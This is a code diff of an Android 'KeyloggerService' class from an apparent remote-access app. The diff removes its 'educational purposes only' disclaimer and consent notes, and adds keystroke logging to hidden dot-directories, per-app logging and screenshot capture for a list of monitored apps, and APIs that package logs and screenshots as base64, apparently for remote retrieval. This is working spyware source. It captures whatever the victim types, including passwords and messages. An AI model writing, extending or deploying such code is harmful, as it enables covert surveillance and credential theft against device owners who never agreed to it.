@@ -1,275 +1,468 @@
 package com.remoteaccess.educational.commands;
 
-import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Context;
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
+import android.util.Base64;
+import android.util.Log;
+import com.remoteaccess.educational.utils.Constants;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
+
+import java.io.BufferedReader;
 import java.io.File;
+import java.io.FileOutputStream;
+import java.io.FileReader;
 import java.io.FileWriter;
+import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.Collections;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
 
 /**
- * EDUCATIONAL KEYLOGGER SERVICE
- * 
- * ⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY
- * - Requires user consent via Accessibility Service
- * - User must manually enable in Settings
- * - Visible in Android Settings > Accessibility
- * - Can be disabled anytime by user
- * - Logs stored locally on device
- * 
- * USE CASES:
- * - Personal device monitoring
- * - Parental control (with child's knowledge)
- * - Security research
- * - Learning Android Accessibility API
+ * KeyloggerService — manages keylog storage and retrieval.
+ *
+ * Storage layout (hidden inside app's private internal directory):
+ *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global keylogs for that day
+ *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-monitored-app keylogs
+ *
+ * Auto-started by UnifiedAccessibilityService when accessibility is granted.
+ * This class is NOT an AccessibilityService itself — it is a utility
+ * called from UnifiedAccessibilityService.
  */
-public class KeyloggerService extends AccessibilityService {
+public class KeyloggerService {
 
     private static final String TAG = "KeyloggerService";
-    private static final String LOG_FILE = "keylog.txt";
-    
-    private List<KeylogEntry> keylogBuffer = new ArrayList<>();
-    private static boolean isEnabled = false;
 
-    public static class KeylogEntry {
-        public String timestamp;
-        public String packageName;
-        public String appName;
-        public String text;
-        public String eventType;
+    private final Context context;
+    private final File    klDir;
 
-        public KeylogEntry(String timestamp, String packageName, String appName, String text, String eventType) {
-            this.timestamp = timestamp;
-            this.packageName = packageName;
-            this.appName = appName;
-            this.text = text;
-            this.eventType = eventType;
-        }
+    private static volatile boolean enabled = false;
 
-        public JSONObject toJSON() throws JSONException {
-            JSONObject json = new JSONObject();
-            json.put("timestamp", timestamp);
-            json.put("packageName", packageName);
-            json.put("appName", appName);
-            json.put("text", text);
-            json.put("eventType", eventType);
-            return json;
-        }
+    public KeyloggerService(Context context) {
+        this.context = context.getApplicationContext();
+        // Hidden dir inside app's private internal storage
+        this.klDir = new File(context.getFilesDir(), Constants.KEYLOG_DIR);
+        if (!klDir.exists()) klDir.mkdirs();
     }
 
-    @Override
-    public void onServiceConnected() {
-        super.onServiceConnected();
-        
-        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | 
-                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
-                         AccessibilityEvent.TYPE_VIEW_CLICKED;
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
-        info.notificationTimeout = 100;
-        
-        setServiceInfo(info);
-        isEnabled = true;
+    // ── Enable / disable ────────────────────────────────────────────────
+
+    public static void setEnabled(boolean on) {
+        enabled = on;
+        Log.i(TAG, "Keylogger " + (on ? "ENABLED" : "DISABLED"));
     }
 
-    @Override
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (!isEnabled) return;
-
-        try {
-            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
-            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
-            String eventType = getEventTypeString(event.getEventType());
-            
-            // Get text from event
-            String text = "";
-            if (event.getText() != null && !event.getText().isEmpty()) {
-                text = event.getText().toString();
-            }
-            
-            // Get text from source node
-            AccessibilityNodeInfo source = event.getSource();
-            if (source != null && text.isEmpty()) {
-                CharSequence nodeText = source.getText();
-                if (nodeText != null) {
-                    text = nodeText.toString();
-                }
-            }
-
-            if (!text.isEmpty()) {
-                KeylogEntry entry = new KeylogEntry(
-                    timestamp,
-                    packageName,
-                    getAppName(packageName),
-                    text,
-                    eventType
-                );
-                
-                keylogBuffer.add(entry);
-                
-                // Save to file periodically
-                if (keylogBuffer.size() >= 10) {
-                    saveToFile();
-                }
-            }
-            
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    public static boolean isEnabled() {
+        return enabled;
     }
 
-    @Override
-    public void onInterrupt() {
-        isEnabled = false;
-        saveToFile(); // Save remaining logs
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        isEnabled = false;
-        saveToFile();
-    }
+    // ── Write a log entry ────────────────────────────────────────────────
 
     /**
-     * Save logs to file
+     * Called from UnifiedAccessibilityService for every text event.
      */
-    private void saveToFile() {
-        if (keylogBuffer.isEmpty()) return;
+    public void logEntry(String packageName, String appName, String text, String eventType) {
+        if (!enabled || text == null || text.isEmpty()) return;
 
-        try {
-            File logFile = new File(getExternalFilesDir(null), LOG_FILE);
-            FileWriter writer = new FileWriter(logFile, true); // Append mode
-            
-            for (KeylogEntry entry : keylogBuffer) {
-                writer.write(entry.toJSON().toString() + "\n");
-            }
-            
-            writer.close();
-            keylogBuffer.clear();
-            
-        } catch (Exception e) {
-            e.printStackTrace();
+        String today = todayStr();
+        JSONObject entry = buildEntry(packageName, appName, text, eventType);
+        String line = entry.toString() + "\n";
+
+        // 1. Write to global day file
+        appendToFile(globalFile(today), line);
+
+        // 2. If package is monitored, write to per-app day file too
+        if (isMonitored(packageName)) {
+            appendToFile(appFile(packageName, today), line);
         }
     }
 
-    /**
-     * Get keylogs as JSON
-     */
-    public static JSONObject getKeylogs(Context context, int limit) {
+    // ── Read / list APIs ────────────────────────────────────────────────
+
+    /** List all available keylog dates (global). */
+    public JSONObject listKeylogFiles() {
         JSONObject result = new JSONObject();
-        
         try {
-            File logFile = new File(context.getExternalFilesDir(null), LOG_FILE);
-            
-            if (!logFile.exists()) {
+            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
+            JSONArray dates = new JSONArray();
+            if (files != null) {
+                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName())); // newest first
+                for (File f : files) {
+                    JSONObject info = new JSONObject();
+                    String name = f.getName().replace(".jsonl", "");
+                    info.put("date", name);
+                    info.put("size", f.length());
+                    info.put("filename", f.getName());
+                    dates.put(info);
+                }
+            }
+            result.put("success", true);
+            result.put("files", dates);
+            result.put("count", dates.length());
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    /** Download a specific day's global keylogs as base64 text. */
+    public JSONObject downloadKeylogFile(String date) {
+        JSONObject result = new JSONObject();
+        try {
+            File f = globalFile(date);
+            if (!f.exists()) {
                 result.put("success", false);
-                result.put("error", "No logs found");
+                result.put("error", "No log file for " + date);
                 return result;
             }
+            String raw = readFile(f);
+            String b64 = Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP);
+            result.put("success", true);
+            result.put("date", date);
+            result.put("base64", b64);
+            result.put("size", f.length());
+            result.put("lineCount", raw.split("\n").length);
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
 
-            // Read file
-            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(logFile));
+    /** Get recent keylogs as JSON array (for live feed). */
+    public JSONObject getKeylogs(int limit) {
+        JSONObject result = new JSONObject();
+        try {
+            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
             JSONArray logs = new JSONArray();
-            String line;
-            int count = 0;
-            
-            while ((line = reader.readLine()) != null && count < limit) {
-                logs.put(new JSONObject(line));
-                count++;
-            }
-            
-            reader.close();
+            List<String> lines = new ArrayList<>();
 
+            if (files != null) {
+                Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
+                for (File f : files) {
+                    List<String> fl = readLines(f);
+                    Collections.reverse(fl);
+                    lines.addAll(fl);
+                    if (lines.size() >= limit) break;
+                }
+            }
+            int count = Math.min(lines.size(), limit);
+            for (int i = 0; i < count; i++) {
+                try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
+            }
             result.put("success", true);
             result.put("logs", logs);
             result.put("count", logs.length());
-            result.put("totalSize", logFile.length());
-            
         } catch (Exception e) {
-            try {
-                result.put("success", false);
-                result.put("error", e.getMessage());
-            } catch (JSONException ex) {
-                ex.printStackTrace();
-            }
+            safeError(result, e);
         }
-        
         return result;
     }
 
-    /**
-     * Clear all logs
-     */
-    public static JSONObject clearLogs(Context context) {
+    /** Clear all global keylogs. */
+    public JSONObject clearKeylogs() {
         JSONObject result = new JSONObject();
-        
         try {
-            File logFile = new File(context.getExternalFilesDir(null), LOG_FILE);
-            
-            if (logFile.exists()) {
-                boolean deleted = logFile.delete();
-                result.put("success", deleted);
-                result.put("message", deleted ? "Logs cleared" : "Failed to clear logs");
-            } else {
-                result.put("success", false);
-                result.put("error", "No logs to clear");
+            File[] files = klDir.listFiles(f -> f.getName().endsWith(".jsonl"));
+            int deleted = 0;
+            if (files != null) {
+                for (File f : files) {
+                    if (f.delete()) deleted++;
+                }
             }
-            
+            result.put("success", true);
+            result.put("deletedFiles", deleted);
         } catch (Exception e) {
-            try {
-                result.put("success", false);
-                result.put("error", e.getMessage());
-            } catch (JSONException ex) {
-                ex.printStackTrace();
-            }
+            safeError(result, e);
         }
-        
         return result;
     }
 
-    /**
-     * Check if service is enabled
-     */
-    public static boolean isServiceEnabled() {
-        return isEnabled;
-    }
+    // ── App Monitor APIs ─────────────────────────────────────────────────
 
-    /**
-     * Get event type as string
-     */
-    private String getEventTypeString(int eventType) {
-        switch (eventType) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                return "TEXT_CHANGED";
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                return "VIEW_FOCUSED";
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                return "VIEW_CLICKED";
-            default:
-                return "UNKNOWN";
-        }
-    }
-
-    /**
-     * Get app name from package name
-     */
-    private String getAppName(String packageName) {
+    /** List all monitored apps that have data stored. */
+    public JSONObject listMonitoredApps() {
+        JSONObject result = new JSONObject();
         try {
-            android.content.pm.PackageManager pm = getPackageManager();
-            android.content.pm.ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
-            return pm.getApplicationLabel(appInfo).toString();
+            File amDir = new File(context.getFilesDir(), Constants.APP_MONITOR_DIR);
+            JSONArray apps = new JSONArray();
+            if (amDir.exists()) {
+                File[] appDirs = amDir.listFiles(File::isDirectory);
+                if (appDirs != null) {
+                    for (File d : appDirs) {
+                        JSONObject info = new JSONObject();
+                        info.put("packageName", d.getName());
+                        info.put("monitored", isMonitored(d.getName()));
+                        // Count keylog files
+                        File klSubDir = new File(d, "kl");
+                        File[] kls = klSubDir.exists() ? klSubDir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
+                        info.put("keylogDays", kls != null ? kls.length : 0);
+                        // Count screenshot files
+                        File ssDir = new File(d, "ss");
+                        File[] sss = ssDir.exists() ? ssDir.listFiles(f -> f.getName().endsWith(".jpg")) : null;
+                        info.put("screenshots", sss != null ? sss.length : 0);
+                        apps.put(info);
+                    }
+                }
+            }
+            result.put("success", true);
+            result.put("apps", apps);
         } catch (Exception e) {
-            return packageName;
+            safeError(result, e);
         }
+        return result;
+    }
+
+    /** Get keylogs for a specific monitored app. */
+    public JSONObject getAppKeylogs(String packageName, String date, int limit) {
+        JSONObject result = new JSONObject();
+        try {
+            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                                packageName + "/kl");
+            JSONArray logs = new JSONArray();
+
+            if (date != null && !date.isEmpty()) {
+                // Specific day
+                File f = new File(dir, date + ".jsonl");
+                if (f.exists()) {
+                    List<String> lines = readLines(f);
+                    for (String l : lines) {
+                        try { logs.put(new JSONObject(l)); } catch (Exception ignored) {}
+                    }
+                }
+            } else {
+                // Latest entries across all days
+                File[] files = dir.exists() ? dir.listFiles(f -> f.getName().endsWith(".jsonl")) : null;
+                List<String> lines = new ArrayList<>();
+                if (files != null) {
+                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
+                    for (File f : files) {
+                        List<String> fl = readLines(f);
+                        Collections.reverse(fl);
+                        lines.addAll(fl);
+                        if (lines.size() >= limit) break;
+                    }
+                }
+                int count = Math.min(lines.size(), limit);
+                for (int i = 0; i < count; i++) {
+                    try { logs.put(new JSONObject(lines.get(i))); } catch (Exception ignored) {}
+                }
+            }
+            result.put("success", true);
+            result.put("packageName", packageName);
+            result.put("logs", logs);
+            result.put("count", logs.length());
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    /** List keylog file dates for an app. */
+    public JSONObject listAppKeylogFiles(String packageName) {
+        JSONObject result = new JSONObject();
+        try {
+            File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                                packageName + "/kl");
+            JSONArray dates = new JSONArray();
+            if (dir.exists()) {
+                File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
+                if (files != null) {
+                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
+                    for (File f : files) {
+                        JSONObject info = new JSONObject();
+                        info.put("date", f.getName().replace(".jsonl", ""));
+                        info.put("size", f.length());
+                        dates.put(info);
+                    }
+                }
+            }
+            result.put("success", true);
+            result.put("files", dates);
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    /** Download a specific day's app keylog as base64. */
+    public JSONObject downloadAppKeylogFile(String packageName, String date) {
+        JSONObject result = new JSONObject();
+        try {
+            File f = appFile(packageName, date);
+            if (!f.exists()) {
+                result.put("success", false);
+                result.put("error", "No log for " + packageName + " on " + date);
+                return result;
+            }
+            String raw = readFile(f);
+            result.put("success", true);
+            result.put("packageName", packageName);
+            result.put("date", date);
+            result.put("base64", Base64.encodeToString(raw.getBytes("UTF-8"), Base64.NO_WRAP));
+            result.put("size", f.length());
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    // ── Screenshot storage for AppMonitor ────────────────────────────────
+
+    /** Store a screenshot for a monitored app. Called from AppMonitor. */
+    public void saveAppScreenshot(String packageName, byte[] jpegData) {
+        try {
+            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                                  packageName + "/ss");
+            if (!ssDir.exists()) ssDir.mkdirs();
+            String ts = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()).format(new Date());
+            File f = new File(ssDir, ts + ".jpg");
+            FileOutputStream fos = new FileOutputStream(f);
+            fos.write(jpegData);
+            fos.close();
+        } catch (Exception e) {
+            Log.e(TAG, "saveAppScreenshot: " + e.getMessage());
+        }
+    }
+
+    /** List screenshots for a monitored app. */
+    public JSONObject listAppScreenshots(String packageName) {
+        JSONObject result = new JSONObject();
+        try {
+            File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                                  packageName + "/ss");
+            JSONArray list = new JSONArray();
+            if (ssDir.exists()) {
+                File[] files = ssDir.listFiles(f -> f.getName().endsWith(".jpg"));
+                if (files != null) {
+                    Arrays.sort(files, (a, b) -> b.getName().compareTo(a.getName()));
+                    for (File f : files) {
+                        JSONObject info = new JSONObject();
+                        info.put("filename", f.getName());
+                        info.put("timestamp", f.getName().replace(".jpg", "").replace("_", " "));
+                        info.put("size", f.length());
+                        list.put(info);
+                    }
+                }
+            }
+            result.put("success", true);
+            result.put("packageName", packageName);
+            result.put("screenshots", list);
+            result.put("count", list.length());
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    /** Download a specific screenshot as base64 JPEG. */
+    public JSONObject downloadAppScreenshot(String packageName, String filename) {
+        JSONObject result = new JSONObject();
+        try {
+            File f = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                              packageName + "/ss/" + filename);
+            if (!f.exists()) {
+                result.put("success", false);
+                result.put("error", "Screenshot not found: " + filename);
+                return result;
+            }
+            byte[] data = readFileBytes(f);
+            result.put("success", true);
+            result.put("packageName", packageName);
+            result.put("filename", filename);
+            result.put("base64", Base64.encodeToString(data, Base64.NO_WRAP));
+            result.put("size", data.length);
+        } catch (Exception e) {
+            safeError(result, e);
+        }
+        return result;
+    }
+
+    // ── Helpers ──────────────────────────────────────────────────────────
+
+    private JSONObject buildEntry(String pkg, String appName, String text, String type) {
+        JSONObject o = new JSONObject();
+        try {
+            o.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
+            o.put("packageName", pkg);
+            o.put("appName", appName != null ? appName : pkg);
+            o.put("text", text);
+            o.put("eventType", type);
+        } catch (JSONException ignored) {}
+        return o;
+    }
+
+    private File globalFile(String date) {
+        return new File(klDir, date + ".jsonl");
+    }
+
+    private File appFile(String packageName, String date) {
+        File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
+                            packageName + "/kl");
+        if (!dir.exists()) dir.mkdirs();
+        return new File(dir, date + ".jsonl");
+    }
+
+    private String todayStr() {
+        return new SimpleDateFormat(Constants.KEYLOG_DATE_FMT, Locale.getDefault()).format(new Date());
+    }
+
+    private boolean isMonitored(String pkg) {
+        for (String p : Constants.MONITORED_PACKAGES) {
+            if (p.equals(pkg)) return true;
+        }
+        return false;
+    }
+
+    private void appendToFile(File f, String line) {
+        try {
+            FileWriter fw = new FileWriter(f, true);
+            fw.write(line);
+            fw.close();
+        } catch (IOException e) {
+            Log.e(TAG, "appendToFile: " + e.getMessage());
+        }
+    }
+
+    private String readFile(File f) throws IOException {
+        BufferedReader br = new BufferedReader(new FileReader(f));
+        StringBuilder sb = new StringBuilder();
+        String line;
+        while ((line = br.readLine()) != null) sb.append(line).append("\n");
+        br.close();
+        return sb.toString();
+    }
+
+    private byte[] readFileBytes(File f) throws IOException {
+        byte[] data = new byte[(int) f.length()];
+        java.io.FileInputStream fis = new java.io.FileInputStream(f);
+        fis.read(data);
+        fis.close();
+        return data;
+    }
+
+    private List<String> readLines(File f) {
+        List<String> result = new ArrayList<>();
+        try {
+            BufferedReader br = new BufferedReader(new FileReader(f));
+            String line;
+            while ((line = br.readLine()) != null) {
+                if (!line.trim().isEmpty()) result.add(line);
+            }
+            br.close();
+        } catch (IOException e) {
+            Log.e(TAG, "readLines: " + e.getMessage());
+        }
+        return result;
+    }
+
+    private void safeError(JSONObject result, Exception e) {
+        try {
+            result.put("success", false);
+            result.put("error", e.getMessage());
+        } catch (JSONException ignored) {}
     }
 }
